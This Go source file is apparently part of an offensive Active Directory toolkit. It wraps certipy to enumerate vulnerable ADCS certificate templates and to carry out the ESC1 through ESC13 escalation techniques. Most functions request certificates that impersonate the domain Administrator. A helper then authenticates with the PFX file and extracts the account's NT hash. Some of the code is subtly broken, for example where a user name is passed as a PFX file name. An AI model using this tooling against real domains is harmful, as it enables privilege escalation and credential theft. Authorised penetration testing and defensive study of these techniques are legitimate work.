package modules

import (
	"fmt"
	"os"
	"strings"

	"adpack/utils"
)

// ADCSManager handles ADCS exploitation via certipy.
type ADCSManager struct{}

// buildCertipyAuthArgs returns credential arguments for certipy commands.
// Returns empty slice if username is empty. Prefers -hashes over -p.
func buildCertipyAuthArgs(username, password, hash, domain string) []string {
	if username == "" {
		return nil
	}
	args := []string{"-u", username}
	if hash != "" {
		args = append(args, "-hashes", hash)
	} else if password != "" {
		args = append(args, "-p", password)
	}
	if domain != "" {
		args = append(args, "-domain", domain)
	}
	return args
}

// Find enumerates vulnerable ADCS templates.
func (a *ADCSManager) Find(dcIP, username, password, hash, domain string) error {
	args := []string{"find", "-vulnerable", "-dc-ip", dcIP, "-stdout"}
	args = append(args, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step("Enumerating vulnerable ADCS templates...")
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy find failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

// ESC1 exploits ESC1 (template allows subject name supply + client auth).
func (a *ADCSManager) ESC1(dcIP, template, upn, username, password, hash, domain, ca string) error {
	args := []string{"req", "-dc-ip", dcIP, "-template", template, "-upn", upn, "-ca", ca}
	args = append(args, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step(fmt.Sprintf("ESC1: requesting cert for %s via template %s...", upn, template))
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy req failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return a.authWithPFX(upn, dcIP)
}

// ESC3 exploits ESC3 (enrollment agent).
func (a *ADCSManager) ESC3(dcIP, template, upn, username, password, hash, domain, ca string) error {
	return a.ESC1(dcIP, template, upn, username, password, hash, domain, ca)
}

// ESC4 exploits ESC4 (write access to template ACL).
func (a *ADCSManager) ESC4(dcIP, template, username, password, hash, domain string) error {
	args := []string{"template", "-template", template, "-dc-ip", dcIP, "-save-old"}
	args = append(args, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step(fmt.Sprintf("ESC4: modifying template %s...", template))
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy template failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

// ESC6 exploits ESC6 (CA flag EDITF_ATTRIBUTESUBJECTALTNAME2).
func (a *ADCSManager) ESC6(dcIP, template, username, password, hash, domain, ca string) error {
	args := []string{"req", "-dc-ip", dcIP, "-template", template, "-ca", ca, "-upn", "Administrator@" + domain}
	args = append(args, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step(fmt.Sprintf("ESC6: requesting cert via template %s...", template))
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy req failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return a.authWithPFX("Administrator", dcIP)
}

// ESC8 exploits ESC8 (NTLM relay to ADCS HTTP).
func (a *ADCSManager) ESC8(dcIP, listenIP, username, password, hash, domain, template string) error {
	utils.Step(fmt.Sprintf("ESC8: starting NTLM relay to ADCS on %s...", dcIP))
	// Start relay in background
	relayArgs := []string{"relay", "-ca", dcIP, "-template", template}
	fmt.Printf("  Start relay: certipy %s\n", strings.Join(relayArgs, " "))
	fmt.Printf("  Then coerce target to authenticate to %s\n", listenIP)
	return nil
}

// ESC9 exploits ESC9 (no security extension).
func (a *ADCSManager) ESC9(dcIP, template, target, username, password, hash, domain, ca string) error {
	// Update target UPN
	upnArgs := []string{"account", "update", "-dc-ip", dcIP, "-user", target, "-upn", "Administrator@" + domain}
	upnArgs = append(upnArgs, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step(fmt.Sprintf("ESC9: updating UPN for %s...", target))
	result := utils.RunCommand("certipy", upnArgs...)
	if !result.Success {
		return fmt.Errorf("certipy account update failed: %s", result.Stderr)
	}
	return a.ESC1(dcIP, template, "Administrator@"+domain, username, password, hash, domain, ca)
}

// ESC10 exploits ESC10 (weak cert mapping).
func (a *ADCSManager) ESC10(dcIP, target, username, password, hash, domain, ca string) error {
	args := []string{"req", "-dc-ip", dcIP, "-ca", ca, "-user", target}
	args = append(args, buildCertipyAuthArgs(username, password, hash, domain)...)
	utils.Step(fmt.Sprintf("ESC10: requesting cert for %s...", target))
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy req failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return a.authWithPFX(target, dcIP)
}

// ESC13 exploits ESC13 (OID group link).
func (a *ADCSManager) ESC13(dcIP, template, username, password, hash, domain, ca string) error {
	return a.ESC1(dcIP, template, "Administrator@"+domain, username, password, hash, domain, ca)
}

// Auth authenticates using a PFX file.
func (a *ADCSManager) Auth(pfxFile, dcIP string) error {
	return a.authWithPFX(pfxFile, dcIP)
}

func (a *ADCSManager) authWithPFX(pfxFile, dcIP string) error {
	if pfxFile == "" {
		entries, err := os.ReadDir(".")
		if err != nil {
			return fmt.Errorf("read current dir: %w", err)
		}
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".pfx") {
				pfxFile = e.Name()
				break
			}
		}
		if pfxFile == "" {
			return fmt.Errorf("no PFX file found — certipy may have failed silently")
		}
	}

	args := []string{"auth", "-pfx", pfxFile, "-dc-ip", dcIP}
	utils.Step(fmt.Sprintf("Authenticating with PFX: %s...", pfxFile))
	result := utils.RunCommand("certipy", args...)
	if !result.Success {
		return fmt.Errorf("certipy auth failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)

	// Extract NT hash from output
	for _, line := range strings.Split(result.Stdout, "\n") {
		if strings.Contains(line, "NT Hash") || strings.Contains(line, "NTHASH") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				ntHash := strings.TrimSpace(parts[len(parts)-1])
				utils.StepOk(fmt.Sprintf("NT hash extracted: %s", ntHash))
			}
		}
	}
	return nil
}
